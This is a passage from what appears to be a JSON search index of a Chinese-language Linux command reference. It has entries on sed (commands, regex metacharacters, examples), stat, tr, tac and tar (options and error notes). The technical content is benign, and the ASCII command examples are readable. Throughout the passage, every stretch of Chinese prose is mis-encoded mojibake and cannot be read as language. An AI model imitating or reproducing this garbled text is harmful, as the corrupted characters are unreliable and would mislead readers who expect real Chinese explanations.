çš„åŠ¨ä½œæ”¯æŒçš„æ˜¯å»¶ä¼¸å‹æ­£è§„è¡¨ç¤ºæ³•çš„è¯­æ³•ã€‚(é»˜è®¤æ˜¯åŸºç¡€æ­£è§„è¡¨ç¤ºæ³•è¯­æ³•) -h , --help æ˜¾ç¤ºå¸®åŠ©ã€‚ -V , --version æ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯ æ–‡æœ¬æ“ä½œæ–¹å¼ æµå¼æ–‡æœ¬ç¼–è¾‘å™¨: a\\ # åœ¨å½“å‰è¡Œä¸‹é¢æ’å…¥æ–‡æœ¬ã€‚ i\\ # åœ¨å½“å‰è¡Œä¸Šé¢æ’å…¥æ–‡æœ¬ã€‚ c\\ # æŠŠé€‰å®šçš„è¡Œæ”¹ä¸ºæ–°çš„æ–‡æœ¬ã€‚ d # åˆ é™¤ï¼Œåˆ é™¤é€‰æ‹©çš„è¡Œã€‚ D # åˆ é™¤æ¨¡æ¿å—çš„ç¬¬ä¸€è¡Œã€‚ s # æ›¿æ¢æŒ‡å®šå­—ç¬¦. é€šå¸¸è¿™ä¸ª s çš„åŠ¨ä½œå¯ä»¥æ­é…æ­£è§„è¡¨ç¤ºæ³•ï¼ä¾‹å¦‚ 1,20s/old/new/g h # æ‹·è´æ¨¡æ¿å—çš„å†…å®¹åˆ°å†…å­˜ä¸­çš„ç¼“å†²åŒºã€‚ H # è¿½åŠ æ¨¡æ¿å—çš„å†…å®¹åˆ°å†…å­˜ä¸­çš„ç¼“å†²åŒºã€‚ g # è·å¾—å†…å­˜ç¼“å†²åŒºçš„å†…å®¹ï¼Œå¹¶æ›¿ä»£å½“å‰æ¨¡æ¿å—ä¸­çš„æ–‡æœ¬ã€‚ è¡¨ç¤ºè¡Œå†…å…¨é¢æ›¿æ¢ã€‚ G # è·å¾—å†…å­˜ç¼“å†²åŒºçš„å†…å®¹ï¼Œå¹¶è¿½åŠ åˆ°å½“å‰æ¨¡æ¿å—æ–‡æœ¬çš„åé¢ã€‚ l # åˆ—è¡¨ä¸èƒ½æ‰“å°å­—ç¬¦çš„æ¸…å•ã€‚ n # è¯»å–ä¸‹ä¸€ä¸ªè¾“å…¥è¡Œï¼Œç”¨ä¸‹ä¸€ä¸ªå‘½ä»¤å¤„ç†æ–°çš„è¡Œè€Œä¸æ˜¯ç”¨ç¬¬ä¸€ä¸ªå‘½ä»¤ã€‚ N # è¿½åŠ ä¸‹ä¸€ä¸ªè¾“å…¥è¡Œåˆ°æ¨¡æ¿å—åé¢å¹¶åœ¨äºŒè€…é—´åµŒå…¥ä¸€ä¸ªæ–°è¡Œï¼Œæ”¹å˜å½“å‰è¡Œå·ç ã€‚ p # æ‰“å°æ¨¡æ¿å—çš„è¡Œã€‚é€šå¸¸ p ä¼šä¸å‚æ•° sed -n ä¸€èµ·è¿è¡Œ P # (å¤§å†™) æ‰“å°æ¨¡æ¿å—çš„ç¬¬ä¸€è¡Œã€‚ q # é€€å‡ºSedã€‚ b lable # åˆ†æ”¯åˆ°è„šæœ¬ä¸­å¸¦æœ‰æ ‡è®°çš„åœ°æ–¹ï¼Œå¦‚æœåˆ†æ”¯ä¸å­˜åœ¨åˆ™åˆ†æ”¯åˆ°è„šæœ¬çš„æœ«å°¾ã€‚ r file # ä»fileä¸­è¯»è¡Œã€‚ t label # ifåˆ†æ”¯ï¼Œä»æœ€åä¸€è¡Œå¼€å§‹ï¼Œæ¡ä»¶ä¸€æ—¦æ»¡è¶³æˆ–è€…Tï¼Œtå‘½ä»¤ï¼Œå°†å¯¼è‡´åˆ†æ”¯åˆ°å¸¦æœ‰æ ‡å·çš„å‘½ä»¤å¤„ï¼Œæˆ–è€…åˆ°è„šæœ¬çš„æœ«å°¾ã€‚ T label # é”™è¯¯åˆ†æ”¯ï¼Œä»æœ€åä¸€è¡Œå¼€å§‹ï¼Œä¸€æ—¦å‘ç”Ÿé”™è¯¯æˆ–è€…Tï¼Œtå‘½ä»¤ï¼Œå°†å¯¼è‡´åˆ†æ”¯åˆ°å¸¦æœ‰æ ‡å·çš„å‘½ä»¤å¤„ï¼Œæˆ–è€…åˆ°è„šæœ¬çš„æœ«å°¾ã€‚ w file # å†™å¹¶è¿½åŠ æ¨¡æ¿å—åˆ°fileæœ«å°¾ã€‚ è¡¨ç¤ºæŠŠè¡Œå†™å…¥ä¸€ä¸ªæ–‡ä»¶ã€‚ W file # å†™å¹¶è¿½åŠ æ¨¡æ¿å—çš„ç¬¬ä¸€è¡Œåˆ°fileæœ«å°¾ã€‚ ! # è¡¨ç¤ºåé¢çš„å‘½ä»¤å¯¹æ‰€æœ‰æ²¡æœ‰è¢«é€‰å®šçš„è¡Œå‘ç”Ÿä½œç”¨ã€‚ = # æ‰“å°å½“å‰è¡Œå·ç ã€‚ # # æŠŠæ³¨é‡Šæ‰©å±•åˆ°ä¸‹ä¸€ä¸ªæ¢è¡Œç¬¦ä»¥å‰ã€‚ x # è¡¨ç¤ºäº’æ¢æ¨¡æ¿å—ä¸­çš„æ–‡æœ¬å’Œç¼“å†²åŒºä¸­çš„æ–‡æœ¬ã€‚ y # è¡¨ç¤ºæŠŠä¸€ä¸ªå­—ç¬¦ç¿»è¯‘ä¸ºå¦å¤–çš„å­—ç¬¦ï¼ˆä½†æ˜¯ä¸ç”¨äºæ­£åˆ™è¡¨è¾¾å¼ï¼‰ \\1 # å­ä¸²åŒ¹é…æ ‡è®° & # å·²åŒ¹é…å­—ç¬¦ä¸²æ ‡è®° $ # å¯è¡¨ç¤ºæœ€åä¸€è¡Œ, æ”¯æŒç”¨ $-1 æ¥è¡¨ç¤ºå€’æ•°ç¬¬äºŒè¡Œç­‰... æŠ€å·§ å¯ä»¥sedåŠ æ–‡ä»¶å: sed \":a;N;s/\\n//g;ta\" a.txt sedæ˜¯æŒ‰è¡Œå¤„ç†æ–‡æœ¬æ•°æ®çš„ï¼Œæ¯æ¬¡å¤„ç†ä¸€è¡Œæ•°æ®åï¼Œéƒ½ä¼šåœ¨è¡Œå°¾è‡ªåŠ¨æ·»åŠ trailing newlineï¼Œå…¶å®å°±æ˜¯è¡Œçš„åˆ†éš”ç¬¦å³æ¢è¡Œç¬¦ã€‚ sedå…ƒå­—ç¬¦é›†: &#94; # åŒ¹é…è¡Œå¼€å§‹ï¼Œå¦‚ï¼š/&#94;sed/åŒ¹é…æ‰€æœ‰ä»¥sedå¼€å¤´çš„è¡Œã€‚ $ # åŒ¹é…è¡Œç»“æŸï¼Œå¦‚ï¼š/sed$/åŒ¹é…æ‰€æœ‰ä»¥sedç»“å°¾çš„è¡Œã€‚ . # åŒ¹é…ä¸€ä¸ªéæ¢è¡Œç¬¦çš„ä»»æ„å­—ç¬¦ï¼Œå¦‚ï¼š/s.d/åŒ¹é…såæ¥ä¸€ä¸ªä»»æ„å­—ç¬¦ï¼Œæœ€åæ˜¯dã€‚ * # åŒ¹é…0ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ï¼Œå¦‚ï¼š/*sed/åŒ¹é…æ‰€æœ‰æ¨¡æ¿æ˜¯ä¸€ä¸ªæˆ–å¤šä¸ªç©ºæ ¼åç´§è·Ÿsedçš„è¡Œã€‚ [] # åŒ¹é…ä¸€ä¸ªæŒ‡å®šèŒƒå›´å†…çš„å­—ç¬¦ï¼Œå¦‚/[ss]ed/åŒ¹é…sedå’ŒSedã€‚ [&#94;] # åŒ¹é…ä¸€ä¸ªä¸åœ¨æŒ‡å®šèŒƒå›´å†…çš„å­—ç¬¦ï¼Œå¦‚ï¼š/[&#94;A-RT-Z]ed/åŒ¹é…ä¸åŒ…å«A-Rå’ŒT-Zçš„ä¸€ä¸ªå­—æ¯å¼€å¤´ï¼Œç´§è·Ÿedçš„è¡Œã€‚ \\(..\\) # åŒ¹é…å­ä¸²ï¼Œä¿å­˜åŒ¹é…çš„å­—ç¬¦ï¼Œå¦‚s/\\(love\\)able/\\1rsï¼Œloveableè¢«æ›¿æ¢æˆloversã€‚ & # ä¿å­˜æœç´¢å­—ç¬¦ç”¨æ¥æ›¿æ¢å…¶ä»–å­—ç¬¦ï¼Œå¦‚s/love/ **&** /ï¼Œloveè¿™æˆ **love** ã€‚ \\< # åŒ¹é…å•è¯çš„å¼€å§‹ï¼Œå¦‚:/\\<love/åŒ¹é…åŒ…å«ä»¥loveå¼€å¤´çš„å•è¯çš„è¡Œã€‚ \\> # åŒ¹é…å•è¯çš„ç»“æŸï¼Œå¦‚/love\\>/åŒ¹é…åŒ…å«ä»¥loveç»“å°¾çš„å•è¯çš„è¡Œã€‚ x\\{m\\} # é‡å¤å­—ç¬¦xï¼Œmæ¬¡ï¼Œå¦‚ï¼š/0\\{5\\}/åŒ¹é…åŒ…å«5ä¸ª0çš„è¡Œã€‚ x\\{m,\\} # é‡å¤å­—ç¬¦xï¼Œè‡³å°‘mæ¬¡ï¼Œå¦‚ï¼š/0\\{5,\\}/åŒ¹é…è‡³å°‘æœ‰5ä¸ª0çš„è¡Œã€‚ x\\{m,n\\} # é‡å¤å­—ç¬¦xï¼Œè‡³å°‘mæ¬¡ï¼Œä¸å¤šäºnæ¬¡ï¼Œå¦‚ï¼š/0\\{5,10\\}/åŒ¹é…5~10ä¸ª0çš„è¡Œã€‚ sedæ›¿æ¢æ ‡è®°: g # è¡¨ç¤ºè¡Œå†…å…¨é¢æ›¿æ¢ã€‚ p # è¡¨ç¤ºæ‰“å°è¡Œã€‚ w # è¡¨ç¤ºæŠŠè¡Œå†™å…¥ä¸€ä¸ªæ–‡ä»¶ã€‚ x # è¡¨ç¤ºäº’æ¢æ¨¡æ¿å—ä¸­çš„æ–‡æœ¬å’Œç¼“å†²åŒºä¸­çš„æ–‡æœ¬ã€‚ y # è¡¨ç¤ºæŠŠä¸€ä¸ªå­—ç¬¦ç¿»è¯‘ä¸ºå¦å¤–çš„å­—ç¬¦ï¼ˆä½†æ˜¯ä¸ç”¨äºæ­£åˆ™è¡¨è¾¾å¼ï¼‰ \\1 # å­ä¸²åŒ¹é…æ ‡è®° & # å·²åŒ¹é…å­—ç¬¦ä¸²æ ‡è®° ä¾‹ åˆ é™¤\"234\"çš„è¡Œï¼ˆæ•´è¡Œåˆ é™¤ï¼‰: echo -e \"123\\n234\\n342\\n\" | sed '/&#94;234$/d' åˆ é™¤ç¬¬äºŒè¡Œ: echo -e \"123\\n234\\n342\\n\" | sed 2d æ›¿æ¢ç©ºæ ¼: echo -e \"123\\n12\\n23\" | sed \":a;N;s/\\n//g;ta\" # tr \"\\n\" \"\" å°±å¥½äº† # Næ˜¯æŠŠä¸‹ä¸€è¡ŒåŠ å…¥åˆ°å½“å‰çš„hold spaceæ¨¡å¼ç©ºé—´é‡Œï¼Œä½¿ä¹‹è¿›è¡Œåç»­å¤„ç†ï¼Œæœ€åsedä¼šé»˜è®¤æ‰“å°hold spaceæ¨¡å¼ç©ºé—´é‡Œçš„å†…å®¹ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œsedæ˜¯å¯ä»¥å¤„ç†å¤šè¡Œæ•°æ®çš„ã€‚ # :aå’Œtaæ˜¯é…å¥—ä½¿ç”¨ï¼Œå®ç°è·³è½¬åŠŸèƒ½ã€‚tæ˜¯testæµ‹è¯•çš„æ„æ€ã€‚ # å¦å¤–ï¼Œè¿˜æœ‰:aå’Œbaçš„é…å¥—ä½¿ç”¨æ–¹å¼ï¼Œä¹Ÿå¯ä»¥å®ç°è·³è½¬åŠŸèƒ½ã€‚bæ˜¯branchåˆ†æ”¯çš„æ„æ€ã€‚ æ‰“å°4-10è¡Œ: sed -n '4,10p' file ä»…åŒ¹é…å­—ç¬¦ä¸²: echo \"abcde\" | sed 's/a\\(.*\\)e/\\1/g' # bcd (ç»“æœ) # \\(...\\) è¡¨ç¤ºä»…åŒ¹é…å­ä¸² # \\1 è¡¨ç¤ºå­ä¸² å·²åŒ¹é…ç»“æœ: echo 'qwer' | sed 's/\\w\\+/\"&\"/g' # \"qwer\" æ›¿æ¢å•å¼•å· åŸå› æš‚æ—¶æ²¡æœ‰æŸ¥åˆ°ï¼Œåªæ‰¾åˆ°è¯´åŠ $å¯ä»¥è½¬ä¹‰bash: sed $'s/\\'//g' æ³¨è§£ sedåé¢å¯ä»¥ä¸ç”¨ä¸‰ä¸ªæ–œæ ï¼Œåªè¦æ˜¯ä¸‰ä¸ªç›¸åŒçš„å­—ç¬¦å°±è¡Œï¼Œè¿™ä¸€ç‚¹å°±æ¯”è¾ƒç¥å¥‡ã€‚ æ‰“å°æ–‡ä»¶ä»¥hhhå¼€å§‹çš„æ‰€æœ‰è¡Œ: sed -n '/hhh/,\\$p' $file åˆ é™¤ç©ºè¡Œ: sed '/&#94;\\s*$/d' $file åœ¨ç¬¬ä¸€è¡Œæ’å…¥ä¸€è¡Œqwe(Macçš„sedä¸æ”¯æŒä½¿ç”¨i): echo 123 | sed '1 i\\qwe'","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-SED.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-SED.html"},{"title":"stat","text":"æŸ¥çœ‹æ–‡ä»¶çš„çŠ¶æ€","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-STAT.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-STAT.html"},{"title":"tr","text":"trå‘½ä»¤ å¯ä»¥å¯¹æ¥è‡ªæ ‡å‡†è¾“å…¥çš„å­—ç¬¦è¿›è¡Œæ›¿æ¢ã€å‹ç¼©å’Œåˆ é™¤ã€‚ è¯­æ³•: tr(é€‰é¡¹)(å‚æ•°) é€‰é¡¹ -c , --complerment å–ä»£æ‰€æœ‰ä¸å±äºç¬¬ä¸€å­—ç¬¦é›†çš„å­—ç¬¦ï¼› -d , --delete åˆ é™¤æ‰€æœ‰å±äºç¬¬ä¸€å­—ç¬¦é›†çš„å­—ç¬¦ï¼› -s , --squeeze-repeats æŠŠè¿ç»­é‡å¤çš„å­—ç¬¦ä»¥å•ç‹¬ä¸€ä¸ªå­—ç¬¦è¡¨ç¤ºï¼› -t , --truncate-set1 å…ˆåˆ é™¤ç¬¬ä¸€å­—ç¬¦é›†è¾ƒç¬¬äºŒå­—ç¬¦é›†å¤šå‡ºçš„å­—ç¬¦ã€‚ å‚æ•° å­—ç¬¦é›†1 æŒ‡å®šè¦è½¬æ¢æˆ–åˆ é™¤çš„åŸå­—ç¬¦é›†ã€‚ å½“æ‰§è¡Œè½¬æ¢æ“ä½œæ—¶ï¼Œå¿…é¡»ä½¿ç”¨å‚æ•° \"å­—ç¬¦é›†2\" æŒ‡å®šè½¬æ¢çš„ç›®æ ‡å­—ç¬¦é›†ã€‚ ä½†æ‰§è¡Œåˆ é™¤æ“ä½œæ—¶ï¼Œä¸éœ€è¦å‚æ•° \"å­—ç¬¦é›†2\"ï¼› å­—ç¬¦é›†2 æŒ‡å®šè¦è½¬æ¢æˆçš„ç›®æ ‡å­—ç¬¦é›† å­—ç¬¦é›†åˆçš„èŒƒå›´: \\NNN å…«è¿›åˆ¶å€¼çš„å­—ç¬¦ NNN (1 to 3 ä¸ºå…«è¿›åˆ¶å€¼çš„å­—ç¬¦) \\\\ åæ–œæ  \\a Ctrl-G é“ƒå£° \\b Ctrl-H é€€æ ¼ç¬¦ \\f Ctrl-L èµ°è¡Œæ¢é¡µ \\n Ctrl-J æ–°è¡Œ \\r Ctrl-M å›è½¦ \\t Ctrl-I tabé”® \\v Ctrl-X æ°´å¹³åˆ¶è¡¨ç¬¦ CHAR1-CHAR2 ï¼šå­—ç¬¦èŒƒå›´ä» CHAR1 åˆ° CHAR2 çš„æŒ‡å®šï¼ŒèŒƒå›´çš„æŒ‡å®šä»¥ ASCII ç çš„æ¬¡åºä¸ºåŸºç¡€ï¼Œåªèƒ½ç”±å°åˆ°å¤§ï¼Œä¸èƒ½ç”±å¤§åˆ°å°ã€‚ [CHAR*] ï¼šè¿™æ˜¯ SET2 ä¸“ç”¨çš„è®¾å®šï¼ŒåŠŸèƒ½æ˜¯é‡å¤æŒ‡å®šçš„å­—ç¬¦åˆ°ä¸ SET1 ç›¸åŒé•¿åº¦ä¸ºæ­¢ [CHAR*REPEAT] ï¼šè¿™ä¹Ÿæ˜¯ SET2 ä¸“ç”¨çš„è®¾å®šï¼ŒåŠŸèƒ½æ˜¯é‡å¤æŒ‡å®šçš„å­—ç¬¦åˆ°è®¾å®šçš„ REPEAT æ¬¡æ•°ä¸ºæ­¢(REPEAT çš„æ•°å­—é‡‡ 8 è¿›ä½åˆ¶è®¡ç®—ï¼Œä»¥ 0 ä¸ºå¼€å§‹) [:alnum:] ï¼šæ‰€æœ‰å­—æ¯å­—ç¬¦ä¸æ•°å­— [:alpha:] ï¼šæ‰€æœ‰å­—æ¯å­—ç¬¦ [:blank:] ï¼šæ‰€æœ‰æ°´å¹³ç©ºæ ¼ [:cntrl:] ï¼šæ‰€æœ‰æ§åˆ¶å­—ç¬¦ [:digit:] ï¼šæ‰€æœ‰æ•°å­— [:graph:] ï¼šæ‰€æœ‰å¯æ‰“å°çš„å­—ç¬¦(ä¸åŒ…å«ç©ºæ ¼ç¬¦) [:lower:] ï¼šæ‰€æœ‰å°å†™å­—æ¯ [:print:] ï¼šæ‰€æœ‰å¯æ‰“å°çš„å­—ç¬¦(åŒ…å«ç©ºæ ¼ç¬¦) [:punct:] ï¼šæ‰€æœ‰æ ‡ç‚¹å­—ç¬¦ [:space:] ï¼šæ‰€æœ‰æ°´å¹³ä¸å‚ç›´ç©ºæ ¼ç¬¦ [:upper:] ï¼šæ‰€æœ‰å¤§å†™å­—æ¯ [:xdigit:] ï¼šæ‰€æœ‰ 16 è¿›ä½åˆ¶çš„æ•°å­— [=CHAR=] ï¼šæ‰€æœ‰ç¬¦åˆæŒ‡å®šçš„å­—ç¬¦(ç­‰å·é‡Œçš„ CHARï¼Œä»£è¡¨ä½ å¯è‡ªè®¢çš„å­—ç¬¦) ä¾‹å¦‚ æ¢è¡Œæ›¿æ¢ä¸ºç©ºæ ¼: tr '\\n' ' ' åˆ é™¤é‡å¤çš„æ¢è¡Œ: tr -s '\\n' ä¾‹: echo \"HELLO WORLD\" | tr 'A-Z' 'a-z' hello world","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Sudden.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Sudden.html"},{"title":"tac","text":"è·Ÿ /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/cat ç›¸å tacå‘½ä»¤å°±æ˜¯å°†æ–‡ä»¶åå‘è¾“å‡º(æœ‰ç¼“å†²)ï¼Œåˆšå¥½å’Œcatè¾“å‡ºç›¸åã€‚ è¯­æ³•æ ¼å¼: tac [å‚æ•°] [æ–‡ä»¶] å¸¸ç”¨å‚æ•° -b åœ¨è¡Œå‰è€Œéè¡Œå°¾æ·»åŠ åˆ†éš”æ ‡å¿— -r å°†åˆ†éš”æ ‡å¿—è§†ä½œæ­£åˆ™è¡¨è¾¾å¼æ¥è§£æ -s ä½¿ç”¨æŒ‡å®šå­—ç¬¦ä¸²ä»£æ›¿æ¢è¡Œä½œä¸ºåˆ†éš”æ ‡å¿— --version æ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯å¹¶é€€å‡º --help æ˜¾ç¤ºæ­¤å¸®åŠ©ä¿¡æ¯å¹¶é€€å‡º å‚è€ƒå®ä¾‹ åå‘åˆ—å‡ºtest.txtæ–‡ä»¶çš„å†…å®¹: [root@linuxcool ~]# cat test.txt hello world hello linuxcool hello linuxprobe [root@linuxcool ~]# tac test.txt hello linuxprobe hello linuxcool hello world","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-TAC.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-TAC.html"},{"title":"tar","text":"å¸¸ç”¨å‡ ä¸ª: -zcvf åˆ›å»ºæ–°åŒ… -zxvf è§£å‹åŒ… -tf æŸ¥çœ‹åŒ…å†…æ–‡ä»¶åˆ—è¡¨ é€‰é¡¹ -c , --create å»ºç«‹æ–°çš„å¤‡ä»½æ–‡ä»¶ -C <dir> åˆ‡æ¢å·¥ä½œç›®å½•ï¼Œå…ˆè¿›å…¥æŒ‡å®šç›®å½•å†æ‰§è¡Œå‹ç¼©/è§£å‹ç¼©æ“ä½œï¼Œ -x , --extract , --get ä»å½’æ¡£æ–‡ä»¶ä¸­æå–æ–‡ä»¶ï¼Œå¯ä»¥æ­é…-Cï¼ˆå¤§å†™ï¼‰åœ¨ç‰¹å®šç›®å½•è§£å¼€ -z , --gzip , --ungzip é€šè¿‡gzipæŒ‡ä»¤å‹ç¼©/è§£å‹ç¼©æ–‡ä»¶ï¼Œæ–‡ä»¶åæœ€å¥½ä¸º*.tar.gz -v , --verbose æ˜¾ç¤ºæŒ‡ä»¤æ‰§è¡Œè¿‡ç¨‹ -t æŸ¥çœ‹æ‰“åŒ…å¥½çš„taråŒ…å†…å®¹(ä¸è§£åŒ…æŸ¥çœ‹) -f <tar_file> , --file= <tar_file> æŒ‡å®šå¤‡ä»½æ–‡ä»¶ï¼› -d è®°å½•æ–‡ä»¶çš„å·®åˆ«ï¼› -r æ·»åŠ æ–‡ä»¶åˆ°å·²ç»å‹ç¼©çš„æ–‡ä»¶ï¼› -u æ·»åŠ æ”¹å˜äº†å’Œç°æœ‰çš„æ–‡ä»¶åˆ°å·²ç»å­˜åœ¨çš„å‹ç¼©æ–‡ä»¶ï¼› -j é€šè¿‡bzip2æŒ‡ä»¤å‹ç¼©/è§£å‹ç¼©æ–‡ä»¶ï¼Œæ–‡ä»¶åæœ€å¥½ä¸º*.tar.bz2ï¼› -l æ–‡ä»¶ç³»ç»Ÿè¾¹ç•Œè®¾ç½®ï¼› -k ä¿ç•™åŸæœ‰æ–‡ä»¶ä¸è¦†ç›–ï¼› -m ä¿ç•™æ–‡ä»¶ä¸è¢«è¦†ç›–ï¼› -w ç¡®è®¤å‹ç¼©æ–‡ä»¶çš„æ­£ç¡®æ€§ï¼› --exclude= <exclude_list> æ’é™¤ä¸æ‰“åŒ…æ–‡ä»¶, æ”¯æŒé€šé…ç¬¦ -p , --same-permissions ä¿ç•™åŸæ¥çš„æ–‡ä»¶æƒé™ä¸å±æ€§, è¿™é‡ŒæŒ‡çš„æ˜¯æ–‡ä»¶çš„ç‰¹æ®Šå±æ€§, å› ä¸ºtaré»˜è®¤å°±ä¼šæ¢å¤æ–‡ä»¶æƒé™ä¸å±æ€§ -P , --absolute-names ä½¿ç”¨æ–‡ä»¶åçš„ç»å¯¹è·¯å¾„ï¼Œä¸ç§»é™¤æ–‡ä»¶åç§°å‰çš„\"/\"å· --owner= user1 æŒ‡å®šè§£å‹åçš„å±ä¸», å®é™…æµ‹è¯•æ²¡ç”¨ --group= group1 æŒ‡å®šè§£å‹åçš„å±ç»„, å®é™…æµ‹è¯•æ²¡ç”¨ -N <æ—¥æœŸæ ¼å¼> , --newer= <æ—¥æœŸæ—¶é—´> åªå°†è¾ƒæŒ‡å®šæ—¥æœŸæ›´æ–°çš„æ–‡ä»¶ä¿å­˜åˆ°å¤‡ä»½æ–‡ä»¶é‡Œï¼› --remove-files å½’æ¡£/å‹ç¼©ä¹‹ååˆ é™¤æºæ–‡ä»¶ -â€“strip-components=NUMBER è§£å‹æ—¶ä»æ–‡ä»¶åä¸­æ¸…é™¤ NUMBER ä¸ªå¼•å¯¼éƒ¨åˆ†, å³æŠ›å¼ƒå‰NUMBERä¸ªè·¯å¾„ å…¨éƒ¨ -A , --catenate æ–°å¢æ–‡ä»¶åˆ°ä»¥å­˜åœ¨çš„å¤‡ä»½æ–‡ä»¶ï¼› -B è®¾ç½®åŒºå—å¤§å°ï¼› -c , --create å»ºç«‹æ–°çš„å¤‡ä»½æ–‡ä»¶ï¼› -C <ç›®å½•> åˆ‡æ¢å·¥ä½œç›®å½•ï¼Œå…ˆè¿›å…¥æŒ‡å®šç›®å½•å†æ‰§è¡Œå‹ç¼©/è§£å‹ç¼©æ“ä½œï¼Œå¯ç”¨äºä»…å‹ç¼©ç‰¹å®šç›®å½•é‡Œçš„å†…å®¹, è§£å‹ç¼©åˆ°ç‰¹å®šç›®å½•ï¼› -d è®°å½•æ–‡ä»¶çš„å·®åˆ«ï¼› -x , --extract , --get ä»å½’æ¡£æ–‡ä»¶ä¸­æå–æ–‡ä»¶ï¼Œå¯ä»¥æ­é…-Cï¼ˆå¤§å†™ï¼‰åœ¨ç‰¹å®šç›®å½•è§£å¼€ï¼Œ éœ€è¦æ³¨æ„çš„æ˜¯-cã€-tã€-xä¸å¯åŒæ—¶å‡ºç°åœ¨ä¸€ä¸²å‘½ä»¤ä¸­ï¼› -t , --list åˆ—å‡ºå¤‡ä»½æ–‡ä»¶çš„å†…å®¹ï¼› -z , --gzip , --ungzip é€šè¿‡gzipæŒ‡ä»¤å‹ç¼©/è§£å‹ç¼©æ–‡ä»¶ï¼Œæ–‡ä»¶åæœ€å¥½ä¸º*.tar.gzï¼› -Z , --compress , --uncompress é€šè¿‡compressæŒ‡ä»¤å¤„ç†å¤‡ä»½æ–‡ä»¶ï¼› -f <å¤‡ä»½æ–‡ä»¶> , --file= <å¤‡ä»½æ–‡ä»¶> æŒ‡å®šå¤‡ä»½æ–‡ä»¶ï¼› -v , --verbose æ˜¾ç¤ºæŒ‡ä»¤æ‰§è¡Œè¿‡ç¨‹ï¼› -r æ·»åŠ æ–‡ä»¶åˆ°å·²ç»å‹ç¼©çš„æ–‡ä»¶ï¼› -u æ·»åŠ æ”¹å˜äº†å’Œç°æœ‰çš„æ–‡ä»¶åˆ°å·²ç»å­˜åœ¨çš„å‹ç¼©æ–‡ä»¶ï¼› -j é€šè¿‡bzip2æŒ‡ä»¤å‹ç¼©/è§£å‹ç¼©æ–‡ä»¶ï¼Œæ–‡ä»¶åæœ€å¥½ä¸º*.tar.bz2ï¼› -v æ˜¾ç¤ºæ“ä½œè¿‡ç¨‹ï¼› -l æ–‡ä»¶ç³»ç»Ÿè¾¹ç•Œè®¾ç½®ï¼› -k ä¿ç•™åŸæœ‰æ–‡ä»¶ä¸è¦†ç›–ï¼› -m ä¿ç•™æ–‡ä»¶ä¸è¢«è¦†ç›–ï¼› -w ç¡®è®¤å‹ç¼©æ–‡ä»¶çš„æ­£ç¡®æ€§ï¼› -p , --same-permissions ä¿ç•™åŸæ¥çš„æ–‡ä»¶æƒé™ä¸å±æ€§ï¼› -P , --absolute-names ä½¿ç”¨æ–‡ä»¶åçš„ç»å¯¹è·¯å¾„ï¼Œä¸ç§»é™¤æ–‡ä»¶åç§°å‰çš„\"/\"å·ï¼› -N <æ—¥æœŸæ ¼å¼> , --newer= <æ—¥æœŸæ—¶é—´> åªå°†è¾ƒæŒ‡å®šæ—¥æœŸæ›´æ–°çš„æ–‡ä»¶ä¿å­˜åˆ°å¤‡ä»½æ–‡ä»¶é‡Œï¼› --exclude= <èŒƒæœ¬æ ·å¼> æ’é™¤ç¬¦åˆèŒƒæœ¬æ ·å¼çš„æ–‡ä»¶ï¼› --remove-files å½’æ¡£/å‹ç¼©ä¹‹ååˆ é™¤æºæ–‡ä»¶ å¦‚: tar zxf xxx.tar.gz -â€“strip-components=1 å‡å®šåŸåŒ…å†…æ–‡ä»¶ä¸º: a/b/c , ä½¿ç”¨ -â€“strip-components=1 å, è§£å‹åçš„å†…å®¹ä»…æœ‰ b/c (å»é™¤äº†å‰ä¸€å±‚ç›®å½•) åˆ é™¤å½’æ¡£ä¸­æ–‡ä»¶ åªèƒ½åˆ é™¤taråŒ…. gzä¸è¡Œ(Macä¸‹ä¸è¡Œ): tar --delete -vf xxx.tar need_delete_file taré»˜è®¤è¡Œä¸ºè¯´æ˜ å…³äºtarä¿ç•™æ–‡ä»¶æƒé™ä¸å±æ€§çš„è¯´æ˜: taré»˜è®¤ä¼šå°½é‡ä¿ç•™æ™®é€šçš„æ–‡ä»¶æƒé™ä¸å±æ€§(å¦‚æ‰€æœ‰è€…, æƒé™å·), ä¸èƒ½ä¿ç•™ç‰¹æ®Šçš„å±æ€§ ç‰¹æ®Šçš„æƒé™éœ€è¦ä½¿ç”¨ -p æ‰èƒ½ä¿ç•™, å¦‚è®¾å¤‡æ–‡ä»¶ã€ç¬¦å·é“¾æ¥ã€ACLsç­‰ å…³äºæŠ¥é”™ï¼š file changed as we read it æ˜¯å› ä¸ºåœ¨æ‰“åŒ…çš„è¿‡ç¨‹ä¸­æ–‡ä»¶å‘ç”Ÿäº†å˜åŒ–ï¼Œæ‰€ä»¥å¯¼è‡´æŠ¥é”™ï¼Œä½†æ˜¯æ‰“åŒ…ä¾ç„¶è¿›è¡Œå¹¶ä¸”æœ‰æ•ˆã€‚ åœ¨ä½¿ç”¨tarå‘½ä»¤æ—¶åŠ ä¸Š--warning=no-file-changedå‚æ•°å³å¯ä¸è¾“å‡ºæŠ¥é”™ã€‚ å…³äºæŠ¥é”™ tar: write error æš‚æ—¶ä¸çŸ¥é“åŸå› , å¯èƒ½åŒä¸€ä¸ªè„šæœ¬ä½¿ç”¨ä¸åŒçš„æ¸ é“æ‰§è¡Œå°±ä¼šæœ‰è¿™ä¸ªæŠ¥é”™, æœäº†ä¸€ä¸‹ä¹Ÿæ²¡æœåˆ° æš‚æ—¶å‘ç°, å»æ‰vå‚æ•°æˆ–è€…é‡å®šå‘åˆ°nullå¯ä»¥è§£å†³ tarç›¸å…³æƒé™å˜åŒ– é»˜è®¤æƒ…å†µä¸‹, å‹ç¼©æ–‡ä»¶æ—¶çš„ç”¨æˆ·æƒé™å˜åŒ–ï¼š 